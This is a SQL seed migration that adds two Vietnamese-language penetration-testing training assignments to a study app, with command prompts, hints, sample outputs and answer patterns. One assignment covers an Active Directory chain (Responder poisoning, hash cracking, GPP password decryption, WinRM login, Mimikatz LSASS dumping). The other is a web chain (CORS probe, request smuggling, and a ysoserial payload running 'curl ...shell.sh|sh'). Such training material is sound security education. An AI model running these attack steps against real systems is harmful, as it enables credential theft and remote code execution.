-- 0041_assignments_batch2: two more full-walkthrough assignments covering
-- the gap topics found in the doc audit -- an AD credential-attack chain
-- (Responder/GPP/Mimikatz) and a web-advanced chain (CORS/smuggling/
-- deserialization) -- so assignments cover these as thoroughly as the labs.

INSERT INTO cards (deck_id, kind, front, payload, source)
SELECT d.id, 'lab', c.front, c.payload::jsonb, 'seed'
FROM (VALUES
  ('Assignment 11 — AD Credential Chain: Responder đến Domain Admin', '{"mode": "assignment", "scenario": "Bạn ở trong mạng nội bộ corp.local, hoàn toàn chưa có credential nào — chỉ có kết nối mạng broadcast với các máy Windows khác.", "steps": [{"output": "[Analyzer] NBT-NS/LLMNR poisoning...\n[SMB] NTLMv2-SSP Client   : 10.10.30.50\n[SMB] NTLMv2-SSP Hash     : jdoe::CORP:1122334...:deadbeef...", "prompt": "Bạn ngồi trong mạng nội bộ corp.local, không có credential nào. Chạy Responder ở chế độ mặc định trên tun0 để chờ hash NetNTLM rơi vào từ broadcast request bị gõ sai tên.", "hint": "responder -I tun0", "type": "command", "patterns": ["responder\\s+-I\\s+tun0"], "explanation": "LLMNR/NBT-NS poisoning không cần credential gì để bắt đầu — chỉ cần ở chung mạng broadcast với nạn nhân. -I chọn interface để lắng nghe."}, {"prompt": "Bắt được hash NetNTLMv2 của jdoe. Hash này có dùng trực tiếp để pass-the-hash (PTH) vào SMB được không?", "type": "choice", "choices": ["Không — NetNTLMv2 chỉ dùng để crack offline tìm plaintext, không PTH được (khác NTLM hash thường lấy từ SAM/NTDS)", "Có, NetNTLMv2 dùng PTH y hệt NTLM hash thường", "Không cần quan tâm, cứ thử PTH xem có được không"], "answer": 0, "explanation": "Rất nhiều người mới nhầm 2 loại hash — NetNTLMv2 (dạng challenge-response) chỉ crack offline được, trong khi NTLM hash thường (dump từ SAM/LSASS/NTDS qua Mimikatz) mới pass-the-hash trực tiếp được."}, {"output": "jdoe:Summer2026!", "prompt": "Crack hash NetNTLMv2 offline bằng hashcat với rockyou.txt.", "hint": "hashcat -m 5600 hash.txt rockyou.txt", "type": "command", "patterns": ["hashcat\\s+-m\\s*5600\\s+hash\\.txt\\s+rockyou\\.txt"], "explanation": "-m 5600 là mode hashcat riêng cho NetNTLMv2 — crack thành công cho credential domain đầu tiên (jdoe/Summer2026!), đủ để đọc các share thông thường."}, {"output": "\\\\corp.local\\SYSVOL\\corp.local\\Policies\\{GUID}\\MACHINE\\Preferences\\Groups\\Groups.xml\ncpassword=\"j1Uyj3Vx8TY9LtLZil2uAu...\"", "prompt": "Với credential jdoe, đọc share SYSVOL (mọi domain user đọc được) — tìm file Groups.xml chứa mật khẩu cũ bị mã hoá (GPP).", "hint": "find /mnt/sysvol -name Groups.xml 2>/dev/null", "type": "command", "patterns": ["find\\s+/mnt/sysvol\\s+-name\\s+Groups\\.xml"], "explanation": "SYSVOL luôn đọc được bởi mọi domain user đã xác thực — Groups Preferences là nguồn credential cũ rất hay bị bỏ sót khi dọn dẹp AD."}, {"output": "Password: AdminGPP_2022!", "prompt": "Giải mã cpassword vừa tìm được bằng key công khai của Microsoft.", "hint": "gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAu...", "type": "command", "patterns": ["gpp-decrypt\\s+\\S+"], "explanation": "gpp-decrypt dùng đúng AES key Microsoft công khai (CVE-2014-1812) — giải mã tức thì, không brute-force."}, {"output": "PS C:\\> whoami\ncorp\\svc-backup\nPS C:\\> net localgroup administrators\ncorp\\svc-backup", "prompt": "Credential AdminGPP_2022! hoá ra thuộc về svc-backup — thành viên local Administrators trên 1 máy workstation. Đăng nhập qua WinRM.", "hint": "evil-winrm -i 10.10.30.50 -u svc-backup -p AdminGPP_2022!", "type": "command", "patterns": ["evil-winrm\\s+-i\\s+10\\.10\\.30\\.50\\s+-u\\s+svc-backup\\s+-p\\s+AdminGPP_2022!"], "explanation": "-i target, -u user, -p password — password reuse của credential GPP cũ vẫn hoạt động, cho shell local admin trên workstation."}, {"output": "mimikatz # sekurlsa::logonpasswords\nAuthentication Id : 0 ; 987654\nmsv :\n  [00000003] Primary\n  * Username : DA-Admin\n  * Domain   : CORP\n  * NTLM     : 7a3b1c9d8e4f2a1b6c5d4e3f2a1b0c9d", "prompt": "Local admin trên workstation. Dump bộ nhớ LSASS để tìm credential của user cấp cao hơn từng đăng nhập trên máy này.", "hint": "mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords", "type": "command", "patterns": ["sekurlsa::logonpasswords"], "explanation": "DA-Admin (rõ ràng là 1 Domain Admin) từng RDP/đăng nhập trên workstation này — NTLM hash của họ vẫn còn trong LSASS, có thể pass-the-hash để chiếm Domain Admin, khép kín chuỗi tấn công từ 0 credential ban đầu."}], "difficulty": "nang_cao", "reference": "## LLMNR/Responder → GPP → Mimikatz\n\nChuỗi tấn công đầy đủ: bắt NetNTLMv2 qua Responder → crack offline → đọc SYSVOL tìm GPP cpassword → giải mã → login WinRM → dump LSASS tìm credential cấp cao hơn. Xem thêm mục 32-33 trong tài liệu chính."}'),
  ('Assignment 12 — Web Advanced Chain: CORS đến RCE qua Deserialization', '{"mode": "assignment", "scenario": "API nội bộ http://10.10.40.5 nghi có nhiều lớp lỗ hổng chồng lên nhau — CORS, request smuggling, và insecure deserialization.", "steps": [{"output": "HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true", "prompt": "API nội bộ http://10.10.40.5/api/profile nghi CORS cấu hình sai. Gửi request với Origin giả để kiểm tra.", "hint": "curl -H \"Origin: https://evil.com\" -I http://10.10.40.5/api/profile", "type": "command", "patterns": ["curl\\s+-H\\s+.?Origin:\\s*https://evil\\.com.?\\s+-I\\s+http://10\\.10\\.40\\.5/api/profile"], "explanation": "Server phản chiếu đúng Origin giả kèm Allow-Credentials: true — xác nhận lỗ hổng CORS cho phép đọc response có cookie/session của victim từ domain khác."}, {"prompt": "Xác nhận CORS cho phép đọc response chứa session token của victim. Để khai thác thực tế, bạn cần victim làm gì?", "type": "choice", "choices": ["Dụ victim mở 1 trang do attacker kiểm soát (evil.com) trong lúc họ đang đăng nhập vào app thật — JS trên trang đó tự động fetch() API và gửi token lấy được về attacker", "Không cần victim làm gì, attacker tự đọc được từ xa không cần tương tác", "Victim phải chủ động copy-paste token cho attacker"], "answer": 0, "explanation": "CORS misconfiguration vẫn cần 1 bước social engineering nhẹ (dụ victim ghé trang độc hại) — khác XSS lưu trữ (stored) không cần victim làm gì thêm sau khi payload đã nằm sẵn trên trang thật."}, {"output": "Request thứ 2 bị delay/timeout bất thường ở backend -- dấu hiệu front-end/back-end hiểu khác nhau về độ dài body (CL.TE desync).", "prompt": "Tiếp tục recon, phát hiện front-end (CDN) và back-end xử lý Content-Length/Transfer-Encoding khác nhau. Gửi raw HTTP request CL.TE để kiểm tra desync.", "hint": "printf \"POST / HTTP/1.1\\r\\nHost: 10.10.40.5\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nX\" | nc 10.10.40.5 80", "type": "command", "patterns": ["(?=.*Content-Length)(?=.*Transfer-Encoding)(?=.*10\\.10\\.40\\.5).*"], "explanation": "CL.TE: front-end tin Content-Length, back-end tin Transfer-Encoding — gửi cả 2 header mâu thuẫn khiến phần dư bị hiểu nhầm là request của người khác."}, {"prompt": "Desync xác nhận được. Impact nghiêm trọng nhất của HTTP request smuggling trong trường hợp này là gì?", "type": "choice", "choices": ["Chèn phần request dư vào hàng đợi của request TIẾP THEO từ 1 user khác qua cùng kết nối tới backend — có thể đánh cắp hoặc thay đổi response họ nhận được", "Chỉ làm chậm server, không có impact bảo mật thực sự", "Chỉ hoạt động nếu front-end và back-end là cùng 1 server vật lý"], "answer": 0, "explanation": "Vì nhiều user share cùng kết nối persistent giữa front-end và back-end, phần request bị ''giấu'' trong body dư ra sẽ được xử lý như request CỦA NGƯỜI DÙNG TIẾP THEO trên cùng kết nối đó — có thể dẫn tới session hijacking hoặc cache poisoning."}, {"output": "Set-Cookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...\n(base64 bắt đầu bằng rO0 -- dấu hiệu Java serialized object)", "prompt": "Ở 1 endpoint khác, cookie session base64 bắt đầu bằng rO0 (Java serialized object). Dùng ysoserial tạo payload RCE với gadget chain CommonsCollections5.", "hint": "java -jar ysoserial.jar CommonsCollections5 \"curl http://10.10.14.5:8000/shell.sh|sh\" | base64 -w0", "type": "command", "patterns": ["ysoserial\\.jar\\s+CommonsCollections5"], "explanation": "rO0AB... là header chuẩn Java serialization — ysoserial tạo payload lợi dụng gadget chain có sẵn trong classpath phổ biến để đạt RCE khi app deserialize cookie không tin cậy."}, {"output": "$ id\nuid=1000(appuser) gid=1000(appuser) groups=1000(appuser)", "prompt": "Thay cookie session bằng payload base64 vừa tạo và gửi request để kích hoạt deserialize, kiểm tra RCE.", "hint": "curl -H \"Cookie: session=<payload-base64>\" http://10.10.40.5/api/profile", "type": "command", "patterns": ["curl\\s+-H\\s+.?Cookie:\\s*session=\\S+.?\\s+http://10\\.10\\.40\\.5/api/profile"], "explanation": "Khi server unserialize cookie chứa payload ysoserial, gadget chain tự thực thi lệnh hệ thống — RCE xác nhận qua output của id, khép kín chuỗi CORS recon → smuggling confirm → deserialization RCE."}], "difficulty": "nang_cao", "reference": "## CORS → HTTP Smuggling → Insecure Deserialization\n\nBa lớp lỗ hổng web nâng cao kết hợp trong 1 chuỗi tấn công thực tế: xác nhận CORS leak session → dùng desync của request smuggling để hiểu rõ kiến trúc front/back-end → khai thác cookie Java serialized để đạt RCE. Xem thêm mục 34 trong tài liệu chính."}')
) AS c(front, payload)
JOIN decks d ON d.slug = 'labs'
  AND d.subject_id = (SELECT id FROM subjects WHERE slug = 'pentest')
ON CONFLICT DO NOTHING;